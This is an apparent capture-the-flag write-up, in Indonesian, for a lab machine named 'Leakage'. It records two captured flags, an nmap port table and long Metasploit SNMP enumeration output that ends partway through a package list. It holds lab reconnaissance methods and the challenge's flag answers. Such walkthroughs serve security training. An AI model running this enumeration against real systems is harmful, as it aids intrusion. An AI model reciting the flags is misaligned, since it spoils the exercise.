
## Flag pertama

bukak website nya dengan port 80, dan ctrl + u 

flag : AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}


# PORT
| Port     | State | Service | Version/Details                                                     |
| -------- | ----- | ------- | ------------------------------------------------------------------- |
| 22/tcp   | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)        |
|          |       |         | ssh-hostkey:                                                        |
|          |       |         | 2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da (RSA)          |
|          |       |         | 256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 (ECDSA)         |
|          |       |         | 256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e (ED25519)       |
| 80/tcp   | open  | http    | Apache httpd 2.4.29 ((Ubuntu))                                      |
|          |       |         | http-generator: WordPress 5.4-alpha-47225                           |
|          |       |         | http-methods: Supported Methods: HEAD POST OPTIONS                  |
|          |       |         | http-title: Root of the Universe – by @lydericlefebvre & @akerva_fr |
|          |       |         | http-server-header: Apache/2.4.29 (Ubuntu)                          |
| 5000/tcp | open  | http    | Python BaseHTTPServer http.server 2 or 3.0 - 3.1                    |
|          |       |         | http-methods: Supported Methods: GET OPTIONS                        |
|          |       |         | http-title: Site doesn't have a title (text/html; charset=utf-8)    |
|          |       |         | http-server-header: Werkzeug/0.16.0 Python/2.7.15+                  |
|          |       | OS      | Linux; CPE: cpe:/o:linux:linux_kernel                               |
| 161/udp  | open  | snmp    |                                                                     |

**Nmap Scan Report for 10.13.37.11**

- Host is up (1.3s latency).
- Not shown: 999 closed UDP ports (port-unreach)

**Scan Details**

- Command: `sudo nmap -sU 10.13.37.11`
- Scan Duration: 1251.37 seconds

## Flag 2 

menggunakan tool **msfconsole** dengan module **scanner/snmp/snmp_enum** AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}


result: 

```bash

[+] 10.13.37.11, Connected.

[*] System information:

Host IP                       : 10.13.37.11
Hostname                      : Leakage
Description                   : Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64
Contact                       : Me <me@example.org>
Location                      : Sitting on the Dock of the Bay
Uptime snmp                   : 5 days, 19:59:41.38
Uptime system                 : 5 days, 19:59:31.78
System date                   : 2024-6-19 17:29:10.0

[*] Network information:

IP forwarding enabled         : no
Default TTL                   : 64
TCP segments received         : 14925068
TCP segments sent             : 14688773
TCP segments retrans          : 132185
Input datagrams               : 16940504
Delivered datagrams           : 16940504
Output datagrams              : 15902942

[*] Network interfaces:

Interface                     : [ up ] lo
Id                            : 1
Mac Address                   : :::::
Type                          : softwareLoopback
Speed                         : 10 Mbps
MTU                           : 65536
In octets                     : 102830500
Out octets                    : 102830500

Interface                     : [ up ] Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
Id                            : 2
Mac Address                   : 00:50:56:b0:d2:71
Type                          : ethernet-csmacd
Speed                         : 1000 Mbps
MTU                           : 1500
In octets                     : 2086673624
Out octets                    : 833029441


[*] Network IP:

Id                  IP Address          Netmask             Broadcast           
2                   10.13.37.11         255.255.255.0       1                   
1                   127.0.0.1           255.0.0.0           0                   

[*] Routing information:

Destination         Next hop            Mask                Metric              
0.0.0.0             10.13.37.2          0.0.0.0             1                   
10.13.37.0          0.0.0.0             255.255.255.0       0                   

[*] TCP connections and listening ports:

Local address       Local port          Remote address      Remote port         State               
0.0.0.0             22                  0.0.0.0             0                   listen              
0.0.0.0             80                  0.0.0.0             0                   listen              
0.0.0.0             5000                0.0.0.0             0                   listen              
10.13.37.11         80                  10.10.16.4          33614               established         
10.13.37.11         80                  10.10.16.4          33622               finWait1            
10.13.37.11         80                  10.10.16.4          33624               finWait1            
10.13.37.11         80                  10.10.16.4          33646               established         
10.13.37.11         80                  10.10.16.4          33654               established         
10.13.37.11         80                  10.10.16.4          33662               established         
10.13.37.11         80                  10.10.16.4          33664               established         
10.13.37.11         80                  10.10.16.4          33670               established         
10.13.37.11         80                  10.10.16.4          33682               established         
10.13.37.11         80                  10.10.16.4          33684               finWait1            
10.13.37.11         80                  10.10.16.4          33698               established         
10.13.37.11         80                  10.10.16.4          33704               established         
10.13.37.11         80                  10.10.16.4          33706               established         
10.13.37.11         80                  10.10.16.4          33716               established         
10.13.37.11         80                  10.10.16.4          33732               established         
10.13.37.11         80                  10.10.16.4          33746               established         
10.13.37.11         80                  10.10.16.4          33754               established         
10.13.37.11         80                  10.10.16.4          33760               established         
10.13.37.11         80                  10.10.16.4          33762               established         
10.13.37.11         80                  10.10.16.4          33776               established         
10.13.37.11         80                  10.10.16.4          33788               established         
10.13.37.11         80                  10.10.16.4          33802               established         
10.13.37.11         80                  10.10.16.4          33812               established         
10.13.37.11         80                  10.10.16.4          33836               synReceived         
10.13.37.11         80                  10.10.16.4          33844               established         
10.13.37.11         80                  10.10.16.4          33846               synReceived         
10.13.37.11         80                  10.10.16.4          33848               established         
10.13.37.11         80                  10.10.16.4          33850               established         
10.13.37.11         80                  10.10.16.4          33866               synReceived         
10.13.37.11         80                  10.10.16.4          33868               synReceived         
10.13.37.11         80                  10.10.16.4          33870               synReceived         
10.13.37.11         80                  10.10.16.4          33876               synReceived         
10.13.37.11         80                  10.10.16.4          33890               synReceived         
10.13.37.11         80                  10.10.16.4          33894               synReceived         
10.13.37.11         80                  10.10.16.4          33908               synReceived         
10.13.37.11         80                  10.10.16.4          33910               synReceived         
10.13.37.11         80                  10.10.16.4          33920               established         
10.13.37.11         80                  10.10.16.4          33930               synReceived         
10.13.37.11         80                  10.10.16.4          35966               timeWait            
10.13.37.11         80                  10.10.16.4          35988               timeWait            
10.13.37.11         80                  10.10.16.4          35996               timeWait            
10.13.37.11         80                  10.10.16.4          36022               timeWait            
10.13.37.11         80                  10.10.16.4          36024               timeWait            
10.13.37.11         80                  10.10.16.4          36032               timeWait            
10.13.37.11         80                  10.10.16.4          36046               timeWait            
10.13.37.11         80                  10.10.16.4          36058               timeWait            
10.13.37.11         80                  10.10.16.4          36062               timeWait            
10.13.37.11         80                  10.10.16.4          36084               timeWait            
10.13.37.11         80                  10.10.16.4          36092               timeWait            
10.13.37.11         80                  10.10.16.4          36094               timeWait            
10.13.37.11         80                  10.10.16.4          38138               timeWait            
10.13.37.11         80                  10.10.16.4          38152               timeWait            
10.13.37.11         80                  10.10.16.4          38362               timeWait            
10.13.37.11         80                  10.10.16.4          38370               timeWait            
10.13.37.11         80                  10.10.16.4          38422               timeWait            
10.13.37.11         80                  10.10.16.4          44292               timeWait            
10.13.37.11         80                  10.10.16.4          44344               timeWait            
10.13.37.11         80                  10.10.16.4          44370               timeWait            
10.13.37.11         80                  10.10.16.4          44372               timeWait            
10.13.37.11         80                  10.10.16.4          44430               timeWait            
10.13.37.11         80                  10.10.16.4          48320               synReceived         
10.13.37.11         80                  10.10.16.4          48328               established         
10.13.37.11         80                  10.10.16.4          48340               synReceived         
10.13.37.11         80                  10.10.16.4          48346               synReceived         
10.13.37.11         80                  10.10.16.4          48354               established         
10.13.37.11         80                  10.10.16.4          48366               established         
10.13.37.11         80                  10.10.16.4          48378               established         
10.13.37.11         80                  10.10.16.4          48392               synReceived         
10.13.37.11         80                  10.10.16.4          48402               synReceived         
10.13.37.11         80                  10.10.16.4          48408               established         
10.13.37.11         80                  10.10.16.4          50170               established         
10.13.37.11         80                  10.10.16.4          50174               established         
10.13.37.11         80                  10.10.16.4          50188               established         
10.13.37.11         80                  10.10.16.4          50190               timeWait            
10.13.37.11         80                  10.10.16.4          50198               established         
10.13.37.11         80                  10.10.16.4          50212               established         
10.13.37.11         80                  10.10.16.4          50218               established         
10.13.37.11         80                  10.10.16.4          50232               established         
10.13.37.11         80                  10.10.16.4          50236               established         
10.13.37.11         80                  10.10.16.4          50246               established         
10.13.37.11         80                  10.10.16.4          50262               established         
10.13.37.11         80                  10.10.16.4          50272               established         
10.13.37.11         80                  10.10.16.4          50280               established         
10.13.37.11         80                  10.10.16.4          56348               timeWait            
10.13.37.11         80                  10.10.16.4          56420               timeWait            
10.13.37.11         80                  10.10.16.4          56462               timeWait            
10.13.37.11         80                  10.10.16.4          56504               timeWait            
10.13.37.11         80                  10.10.16.4          56556               timeWait            
10.13.37.11         80                  10.10.16.4          56558               timeWait            
10.13.37.11         5000                10.10.14.6          53740               closeWait           
10.13.37.11         5000                10.10.14.15         33368               closeWait           
10.13.37.11         37322               10.10.14.2          9001                closeWait           
10.13.37.11         49008               10.10.14.6          6969                established         
10.13.37.11         54562               10.10.14.15         4444                closeWait           
127.0.0.1           3306                0.0.0.0             0                   listen              
127.0.0.53          53                  0.0.0.0             0                   listen              

[*] Listening UDP ports:

Local address       Local port          
0.0.0.0             161                 
0.0.0.0             39160               
127.0.0.53          53                  

[*] Storage information:

Description                   : ["Physical memory"]
Device id                     : [#<SNMP::Integer:0x00007f402d5a3448 @value=1>]
Filesystem type               : ["Ram"]
Device unit                   : [#<SNMP::Integer:0x00007f402d593728 @value=1024>]
Memory size                   : 1.95 GB
Memory used                   : 1.85 GB

Description                   : ["Virtual memory"]
Device id                     : [#<SNMP::Integer:0x00007f402d5714c0 @value=3>]
Filesystem type               : ["Virtual Memory"]
Device unit                   : [#<SNMP::Integer:0x00007f402d561930 @value=1024>]
Memory size                   : 3.94 GB
Memory used                   : 1.87 GB

Description                   : ["Memory buffers"]
Device id                     : [#<SNMP::Integer:0x00007f402d541b58 @value=6>]
Filesystem type               : ["Other"]
Device unit                   : [#<SNMP::Integer:0x00007f402d532298 @value=1024>]
Memory size                   : 1.95 GB
Memory used                   : 117.58 MB

Description                   : ["Cached memory"]
Device id                     : [#<SNMP::Integer:0x00007f402d507598 @value=7>]
Filesystem type               : ["Other"]
Device unit                   : [#<SNMP::Integer:0x00007f402d4f7eb8 @value=1024>]
Memory size                   : 737.48 MB
Memory used                   : 737.48 MB

Description                   : ["Shared memory"]
Device id                     : [#<SNMP::Integer:0x00007f402d4d7780 @value=8>]
Filesystem type               : ["Other"]
Device unit                   : [#<SNMP::Integer:0x00007f402d4d43a0 @value=1024>]
Memory size                   : 17.70 MB
Memory used                   : 17.70 MB

Description                   : ["Swap space"]
Device id                     : [#<SNMP::Integer:0x00007f402d4a8548 @value=10>]
Filesystem type               : ["Virtual Memory"]
Device unit                   : [#<SNMP::Integer:0x00007f402d498058 @value=1024>]
Memory size                   : 2.00 GB
Memory used                   : 13.95 MB

Description                   : ["/"]
Device id                     : [#<SNMP::Integer:0x00007f402d47ce20 @value=31>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0x00007f402d46d920 @value=4096>]
Memory size                   : 9.78 GB
Memory used                   : 5.29 GB

Description                   : ["/run"]
Device id                     : [#<SNMP::Integer:0x00007f402d44d648 @value=37>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0x00007f402d4418e8 @value=4096>]
Memory size                   : 199.38 MB
Memory used                   : 1.08 MB

Description                   : ["/dev/shm"]
Device id                     : [#<SNMP::Integer:0x00007f402d420238 @value=39>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0x00007f402d4101f8 @value=4096>]
Memory size                   : 996.87 MB
Memory used                   : 0 bytes

Description                   : ["/run/lock"]
Device id                     : [#<SNMP::Integer:0x00007f402d3eaed0 @value=40>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0x00007f402d3db340 @value=4096>]
Memory size                   : 5.00 MB
Memory used                   : 0 bytes

Description                   : ["/sys/fs/cgroup"]
Device id                     : [#<SNMP::Integer:0x00007f402d3ba5c8 @value=41>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0x00007f402d3af948 @value=4096>]
Memory size                   : 996.87 MB
Memory used                   : 0 bytes


[*] File system information:

Index                         : 1
Mount point                   : /
Remote mount point            : -
Type                          : LinuxExt2
Access                        : 1
Bootable                      : 1

[*] Device information:

Id                  Type                Status              Descr               
196608              Processor           running             AuthenticAMD: AMD EPYC 7763 64-Core Processor
196609              Processor           running             AuthenticAMD: AMD EPYC 7763 64-Core Processor
262145              Network             running             network interface lo
262146              Network             running             network interface ens33
786432              Coprocessor         unknown             Guessing that there's a floating point co-processor

[*] Software components:

Index               Name                
1                   accountsservice-0.6.45-1ubuntu1
2                   acl-2.2.52-3build1  
3                   acpid-1:2.0.28-1ubuntu1
4                   adduser-3.116ubuntu1
5                   amd64-microcode-3.20191021.1+really3.20181128.1~ubuntu0.18.04.1
6                   apache2-2.4.29-1ubuntu4.11
7                   apache2-bin-2.4.29-1ubuntu4.11
8                   apache2-data-2.4.29-1ubuntu4.11
9                   apache2-utils-2.4.29-1ubuntu4.11
10                  apparmor-2.12-4ubuntu5.1
11                  apport-2.20.9-0ubuntu7.9
12                  apport-symptoms-0.20
13                  apt-1.6.12          
14                  apt-utils-1.6.12    
15                  at-3.1.20-3.1ubuntu2
16                  base-files-10.1ubuntu2.7
17                  base-passwd-3.5.44  
18                  bash-4.4.18-2ubuntu1.2
19                  bash-completion-1:2.8-1ubuntu1
20                  bc-1.07.1-2         
21                  bcache-tools-1.0.8-2build1
22                  bind9-host-1:9.11.3+dfsg-1ubuntu1.11
23                  binutils-2.30-21ubuntu1~18.04.2
24                  binutils-common-2.30-21ubuntu1~18.04.2
25                  binutils-x86-64-linux-gnu-2.30-21ubuntu1~18.04.2
26                  bsdmainutils-11.1.2ubuntu1
27                  bsdutils-1:2.31.1-0.4ubuntu3.4
28                  btrfs-progs-4.15.1-1build1
29                  btrfs-tools-4.15.1-1build1
30                  busybox-initramfs-1:1.27.2-2ubuntu3.2
31                  busybox-static-1:1.27.2-2ubuntu3.2
32                  byobu-5.125-0ubuntu1
33                  bzip2-1.0.6-8.1ubuntu0.2
34                  ca-certificates-20180409
35                  cloud-guest-utils-0.30-0ubuntu5
36                  cloud-init-19.2-36-g059d049c-0ubuntu2~18.04.1
37                  cloud-initramfs-copymods-0.40ubuntu1.1
38                  cloud-initramfs-dyn-netconf-0.40ubuntu1.1
39                  command-not-found-18.04.5
40                  command-not-found-data-18.04.5
41                  console-setup-1.178ubuntu2.9
42                  console-setup-linux-1.178ubuntu2.9
43                  coreutils-8.28-1ubuntu1
44                  cpio-2.12+dfsg-6ubuntu0.18.04.1
45                  cpp-4:7.4.0-1ubuntu2.3
46                  cpp-7-7.4.0-1ubuntu1~18.04.1
47                  crda-3.18-1build1   
48                  cron-3.0pl1-128.1ubuntu1
49                  cryptsetup-2:2.0.2-1ubuntu1.1
50                  cryptsetup-bin-2:2.0.2-1ubuntu1.1
51                  dash-0.5.8-2.10     
52                  dbus-1.12.2-1ubuntu1.1
53                  debconf-1.5.66ubuntu1
54                  debconf-i18n-1.5.66ubuntu1
55                  debianutils-4.8.4   
56                  diffutils-1:3.6-1   
57                  dirmngr-2.2.4-1ubuntu1.2
58                  distro-info-data-0.37ubuntu0.6
59                  dmeventd-2:1.02.145-4.1ubuntu3.18.04.1
60                  dmidecode-3.1-1     
61                  dmsetup-2:1.02.145-4.1ubuntu3.18.04.1
62                  dnsmasq-base-2.79-1 
63                  dnsutils-1:9.11.3+dfsg-1ubuntu1.11
64                  dosfstools-4.1-1    
65                  dpkg-1.19.0.5ubuntu2.3
66                  dpkg-dev-1.19.0.5ubuntu2.3
67                  e2fsprogs-1.44.1-1ubuntu1.2
68                  eatmydata-105-6     
69                  ebtables-2.0.10.4-3.5ubuntu2.18.04.3
70                  ed-1.10-2.1         
71                  eject-2.1.5+deb1+cvs20081104-13.2
72                  ethtool-1:4.15-0ubuntu1
73                  fakeroot-1.22-2ubuntu1
74                  fdisk-2.31.1-0.4ubuntu3.4
75                  file-1:5.32-2ubuntu0.3
76                  findutils-4.6.0+git+20170828-2
77                  fontconfig-config-2.12.6-0ubuntu2
78                  fonts-dejavu-core-2.37-1
79                  fonts-ubuntu-console-0.83-2
80                  friendly-recovery-0.2.38ubuntu1.1
81                  ftp-0.17-34         
82                  fuse-2.9.7-1ubuntu1 
83                  gawk-1:4.1.4+dfsg-1build1
84                  gcc-7-base-7.4.0-1ubuntu1~18.04.1
85                  gcc-8-base-8.3.0-6ubuntu1~18.04.1
86                  gdisk-1.0.3-1       
87                  geoip-database-20180315-1
88                  gettext-base-0.19.8.1-6ubuntu0.3
89                  gir1.2-glib-2.0-1.56.1-1
90                  git-1:2.17.1-1ubuntu0.4
91                  git-man-1:2.17.1-1ubuntu0.4
92                  gnupg-2.2.4-1ubuntu1.2
93                  gnupg-l10n-2.2.4-1ubuntu1.2
94                  gnupg-utils-2.2.4-1ubuntu1.2
95                  gpg-2.2.4-1ubuntu1.2
96                  gpg-agent-2.2.4-1ubuntu1.2
97                  gpg-wks-client-2.2.4-1ubuntu1.2
98                  gpg-wks-server-2.2.4-1ubuntu1.2
99                  gpgconf-2.2.4-1ubuntu1.2
100                 gpgsm-2.2.4-1ubuntu1.2
101                 gpgv-2.2.4-1ubuntu1.2
102                 grep-3.1-2build1    
103                 groff-base-1.22.3-10
104                 grub-common-2.02-2ubuntu8.14
105                 grub-gfxpayload-lists-0.7
106                 grub-legacy-ec2-1:1 
107                 grub-pc-2.02-2ubuntu8.14
108                 grub-pc-bin-2.02-2ubuntu8.14
109                 grub2-common-2.02-2ubuntu8.14
110                 gzip-1.6-5ubuntu1   
111                 hdparm-9.54+ds-1    
112                 hostname-3.20       
113                 htop-2.1.0-3        
114                 ifupdown-0.8.17ubuntu1.1
115                 info-6.5.0.dfsg.1-2 
116                 init-1.51           
117                 init-system-helpers-1.51
118                 initramfs-tools-0.130ubuntu3.9
119                 initramfs-tools-bin-0.130ubuntu3.9
120                 initramfs-tools-core-0.130ubuntu3.9
121                 install-info-6.5.0.dfsg.1-2
122                 intel-microcode-3.20191115.1ubuntu0.18.04.2
123                 iproute2-4.15.0-2ubuntu1
124                 iptables-1.6.1-2ubuntu2
125                 iputils-ping-3:20161105-1ubuntu3
126                 iputils-tracepath-3:20161105-1ubuntu3
127                 irqbalance-1.3.0-0.1ubuntu0.18.04.1
128                 isc-dhcp-client-4.3.5-3ubuntu7.1
129                 isc-dhcp-common-4.3.5-3ubuntu7.1
130                 iso-codes-3.79-1    
131                 iucode-tool-2.3.1-1 
132                 iw-4.14-0.1         
133                 javascript-common-11
134                 kbd-2.0.4-2ubuntu1  
135                 keyboard-configuration-1.178ubuntu2.9
136                 klibc-utils-2.0.4-9ubuntu2
137                 kmod-24-1ubuntu3.2  
138                 krb5-locales-1.16-2ubuntu0.1
139                 landscape-common-18.01-0ubuntu3.4
140                 language-selector-common-0.188.3
141                 less-487-0.1        
142                 libaccountsservice0-0.6.45-1ubuntu1
143                 libacl1-2.2.52-3build1
144                 libaio1-0.3.110-5ubuntu0.1
145                 libalgorithm-diff-perl-1.19.03-1
146                 libalgorithm-diff-xs-perl-0.04-5
147                 libalgorithm-merge-perl-0.08-3
148                 libapache2-mod-php-1:7.2+60ubuntu1
149                 libapache2-mod-php7.2-7.2.24-0ubuntu0.18.04.2
150                 libapparmor1-2.12-4ubuntu5.1
151                 libapr1-1.6.3-2     
152                 libaprutil1-1.6.1-2 
153                 libaprutil1-dbd-sqlite3-1.6.1-2
154                 libaprutil1-ldap-1.6.1-2
155                 libapt-inst2.0-1.6.12
156                 libapt-pkg5.0-1.6.12
157                 libargon2-0-0~20161029-1.1
158                 libasan4-7.4.0-1ubuntu1~18.04.1
159                 libasn1-8-heimdal-7.5.0+dfsg-1
160                 libassuan0-2.5.1-2  
161                 libatm1-1:2.5.1-2build1
162                 libatomic1-8.3.0-6ubuntu1~18.04.1
163                 libattr1-1:2.4.47-2build1
164                 libaudit-common-1:2.8.2-1ubuntu1
165                 libaudit1-1:2.8.2-1ubuntu1
166                 libbind9-160-1:9.11.3+dfsg-1ubuntu1.11
167                 libbinutils-2.30-21ubuntu1~18.04.2
168                 libblkid1-2.31.1-0.4ubuntu3.4
169                 libbsd0-0.8.7-1     
170                 libbz2-1.0-1.0.6-8.1ubuntu0.2
171                 libc-bin-2.27-3ubuntu1
172                 libc-dev-bin-2.27-3ubuntu1
173                 libc6-2.27-3ubuntu1 
174                 libc6-dev-2.27-3ubuntu1
175                 libc6-i386-2.27-3ubuntu1
176                 libc6-x32-2.27-3ubuntu1
177                 libcap-ng0-0.7.7-3.1
178                 libcap2-1:2.25-1.2  
179                 libcap2-bin-1:2.25-1.2
180                 libcc1-0-8.3.0-6ubuntu1~18.04.1
181                 libcgi-fast-perl-1:2.13-1
182                 libcgi-pm-perl-4.38-1
183                 libcilkrts5-7.4.0-1ubuntu1~18.04.1
184                 libcom-err2-1.44.1-1ubuntu1.2
185                 libcryptsetup12-2:2.0.2-1ubuntu1.1
186                 libcurl3-gnutls-7.58.0-2ubuntu3.8
187                 libdb5.3-5.3.28-13.1ubuntu1.1
188                 libdbus-1-3-1.12.2-1ubuntu1.1
189                 libdbus-glib-1-2-0.110-2
190                 libdebconfclient0-0.213ubuntu1
191                 libdevmapper-event1.02.1-2:1.02.145-4.1ubuntu3.18.04.1
192                 libdevmapper1.02.1-2:1.02.145-4.1ubuntu3.18.04.1
193                 libdns-export1100-1:9.11.3+dfsg-1ubuntu1.11
194                 libdns1100-1:9.11.3+dfsg-1ubuntu1.11
195                 libdpkg-perl-1.19.0.5ubuntu2.3
196                 libdrm-common-2.4.97-1ubuntu1~18.04.1
197                 libdrm2-2.4.97-1ubuntu1~18.04.1
198                 libdumbnet1-1.12-7build1
199                 libeatmydata1-105-6 
200                 libedit2-3.1-20170329-1
201                 libelf1-0.170-0.4ubuntu0.1
202                 libencode-locale-perl-1.05-1
203                 liberror-perl-0.17025-1
204                 libestr0-0.1.10-2.1 
205                 libevent-2.1-6-2.1.8-stable-4build1
206                 libevent-core-2.1-6-2.1.8-stable-4build1
207                 libexpat1-2.2.5-3ubuntu0.2
208                 libexpat1-dev-2.2.5-3ubuntu0.2
209                 libext2fs2-1.44.1-1ubuntu1.2
210                 libfakeroot-1.22-2ubuntu1
211                 libfastjson4-0.99.8-2
212                 libfcgi-perl-0.78-2build1
213                 libfdisk1-2.31.1-0.4ubuntu3.4
214                 libffi6-3.2.1-8     
215                 libfile-fcntllock-perl-0.22-3build2
216                 libfontconfig1-2.12.6-0ubuntu2
217                 libfreetype6-2.8.1-2ubuntu2
218                 libfribidi0-0.19.7-2
219                 libfuse2-2.9.7-1ubuntu1
220                 libgcc-7-dev-7.4.0-1ubuntu1~18.04.1
221                 libgcc1-1:8.3.0-6ubuntu1~18.04.1
222                 libgcrypt20-1.8.1-4ubuntu1.1
223                 libgd3-2.2.5-4ubuntu0.3
224                 libgdbm-compat4-1.14.1-6
225                 libgdbm5-1.14.1-6   
226                 libgeoip1-1.6.12-1  
227                 libgirepository-1.0-1-1.56.1-1
228                 libglib2.0-0-2.56.4-0ubuntu0.18.04.4
229                 libglib2.0-data-2.56.4-0ubuntu0.18.04.4
230                 libgmp10-2:6.1.2+dfsg-2
231                 libgnutls30-3.5.18-1ubuntu1.1
232                 libgomp1-8.3.0-6ubuntu1~18.04.1
233                 libgpg-error0-1.27-6
234                 libgpm2-1.20.7-5    
235                 libgssapi-krb5-2-1.16-2ubuntu0.1
236                 libgssapi3-heimdal-7.5.0+dfsg-1
237                 libhcrypto4-heimdal-7.5.0+dfsg-1
238                 libheimbase1-heimdal-7.5.0+dfsg-1
239                 libheimntlm0-heimdal-7.5.0+dfsg-1
240                 libhogweed4-3.4-1   
241                 libhtml-parser-perl-3.72-3build1
242                 libhtml-tagset-perl-3.20-3
243                 libhtml-template-perl-2.97-1
244                 libhttp-date-perl-6.02-1
245                 libhttp-message-perl-6.14-1
246                 libhx509-5-heimdal-7.5.0+dfsg-1
247                 libicu60-60.2-3ubuntu3
248                 libidn11-1.33-2.1ubuntu1.2
249                 libidn2-0-2.0.4-1.1ubuntu0.2
250                 libio-html-perl-1.001-1
251                 libip4tc0-1.6.1-2ubuntu2
252                 libip6tc0-1.6.1-2ubuntu2
253                 libiptc0-1.6.1-2ubuntu2
254                 libirs160-1:9.11.3+dfsg-1ubuntu1.11
255                 libisc-export169-1:9.11.3+dfsg-1ubuntu1.11
256                 libisc169-1:9.11.3+dfsg-1ubuntu1.11
257                 libisccc160-1:9.11.3+dfsg-1ubuntu1.11
258                 libisccfg160-1:9.11.3+dfsg-1ubuntu1.11
259                 libisl19-0.19-1     
260                 libisns0-0.97-2build1
261                 libitm1-8.3.0-6ubuntu1~18.04.1
262                 libjbig0-2.1-3.1build1
263                 libjpeg-turbo8-1.5.2-0ubuntu5.18.04.3
264                 libjpeg8-8c-2ubuntu8
265                 libjs-jquery-3.2.1-1
266                 libjson-c3-0.12.1-1.3
267                 libk5crypto3-1.16-2ubuntu0.1
268                 libkeyutils1-1.5.9-9.2ubuntu2
269                 libklibc-2.0.4-9ubuntu2
270                 libkmod2-24-1ubuntu3.2
271                 libkrb5-26-heimdal-7.5.0+dfsg-1
272                 libkrb5-3-1.16-2ubuntu0.1
273                 libkrb5support0-1.16-2ubuntu0.1
274                 libksba8-1.3.5-2    
275                 libldap-2.4-2-2.4.45+dfsg-1ubuntu1.4
276                 libldap-common-2.4.45+dfsg-1ubuntu1.4
277                 liblocale-gettext-perl-1.07-3build2
278                 liblsan0-8.3.0-6ubuntu1~18.04.1
279                 liblua5.2-0-5.2.4-1.1build1
280                 liblvm2app2.2-2.02.176-4.1ubuntu3.18.04.1
281                 liblvm2cmd2.02-2.02.176-4.1ubuntu3.18.04.1
282                 liblwp-mediatypes-perl-6.02-1
283                 liblwres160-1:9.11.3+dfsg-1ubuntu1.11
284                 liblxc-common-3.0.3-0ubuntu1~18.04.1
285                 liblz4-1-0.0~r131-2ubuntu3
286                 liblzma5-5.2.2-1.3  
287                 liblzo2-2-2.08-1.2  
288                 libmagic-mgc-1:5.32-2ubuntu0.3
289                 libmagic1-1:5.32-2ubuntu0.3
290                 libmnl0-1.0.4-2     
291                 libmount1-2.31.1-0.4ubuntu3.4
292                 libmpc3-1.1.0-1     
293                 libmpdec2-2.4.2-1ubuntu1
294                 libmpfr6-4.0.1-1    
295                 libmpx2-8.3.0-6ubuntu1~18.04.1
296                 libmspack0-0.6-3ubuntu0.3
297                 libncurses5-6.1-1ubuntu1.18.04
298                 libncursesw5-6.1-1ubuntu1.18.04
299                 libnetfilter-conntrack3-1.0.6-2
300                 libnettle6-3.4-1    
301                 libnewt0.52-0.52.20-1ubuntu1
302                 libnfnetlink0-1.0.1-3
303                 libnghttp2-14-1.30.0-1ubuntu1
304                 libnih1-1.0.3-6ubuntu2
305                 libnl-3-200-3.2.29-0ubuntu3
306                 libnl-genl-3-200-3.2.29-0ubuntu3
307                 libnpth0-1.5-3      
308                 libnss-systemd-237-3ubuntu10.33
309                 libntfs-3g88-1:2017.3.23-2ubuntu0.18.04.2
310                 libnuma1-2.0.11-2.1ubuntu0.1
311                 libp11-kit0-0.23.9-2
312                 libpam-cap-1:2.25-1.2
313                 libpam-modules-1.1.8-3.6ubuntu2.18.04.1
314                 libpam-modules-bin-1.1.8-3.6ubuntu2.18.04.1
315                 libpam-runtime-1.1.8-3.6ubuntu2.18.04.1
316                 libpam-systemd-237-3ubuntu10.33
317                 libpam0g-1.1.8-3.6ubuntu2.18.04.1
318                 libparted2-3.2-20ubuntu0.2
319                 libpcap0.8-1.8.1-6ubuntu1
320                 libpci-dev-1:3.5.2-1ubuntu1.1
321                 libpci3-1:3.5.2-1ubuntu1.1
322                 libpcre3-2:8.39-9   
323                 libperl5.26-5.26.1-6ubuntu0.3
324                 libpipeline1-1.5.0-1
325                 libplymouth4-0.9.3-1ubuntu7.18.04.2
326                 libpng16-16-1.6.34-1ubuntu0.18.04.2
327                 libpolkit-agent-1-0-0.105-20ubuntu0.18.04.5
328                 libpolkit-backend-1-0-0.105-20ubuntu0.18.04.5
329                 libpolkit-gobject-1-0-0.105-20ubuntu0.18.04.5
330                 libpopt0-1.16-11    
331                 libprocps6-2:3.3.12-3ubuntu1.2
332                 libpsl5-0.19.1-5build1
333                 libpython-all-dev-2.7.15~rc1-1
334                 libpython-dev-2.7.15~rc1-1
335                 libpython-stdlib-2.7.15~rc1-1
336                 libpython2.7-2.7.15-4ubuntu4~18.04.2
337                 libpython2.7-dev-2.7.15-4ubuntu4~18.04.2
338                 libpython2.7-minimal-2.7.15-4ubuntu4~18.04.2
339                 libpython2.7-stdlib-2.7.15-4ubuntu4~18.04.2
340                 libpython3-stdlib-3.6.7-1~18.04
341                 libpython3.6-3.6.9-1~18.04
342                 libpython3.6-minimal-3.6.9-1~18.04
343                 libpython3.6-stdlib-3.6.9-1~18.04
344                 libquadmath0-8.3.0-6ubuntu1~18.04.1
345                 libreadline5-5.2+dfsg-3build1
346                 libreadline7-7.0-3  
347                 libroken18-heimdal-7.5.0+dfsg-1
348                 librtmp1-2.4+20151223.gitfa8646d.1-1
349                 libsasl2-2-2.1.27~101-g0780600+dfsg-3ubuntu2
350                 libsasl2-modules-2.1.27~101-g0780600+dfsg-3ubuntu2
351                 libsasl2-modules-db-2.1.27~101-g0780600+dfsg-3ubuntu2
352                 libseccomp2-2.4.1-0ubuntu0.18.04.2
353                 libselinux1-2.7-2build2
354                 libsemanage-common-2.7-2build2
355                 libsemanage1-2.7-2build2
356                 libsensors4-1:3.4.0-4
357                 libsensors4-dev-1:3.4.0-4
358                 libsepol1-2.7-1     
359                 libsigsegv2-2.12-1  
360                 libslang2-2.3.1a-3ubuntu1
361                 libsmartcols1-2.31.1-0.4ubuntu3.4
362                 libsnmp-base-5.7.3+dfsg-1.8ubuntu3.3
363                 libsnmp-dev-5.7.3+dfsg-1.8ubuntu3.3
364                 libsnmp30-5.7.3+dfsg-1.8ubuntu3.3
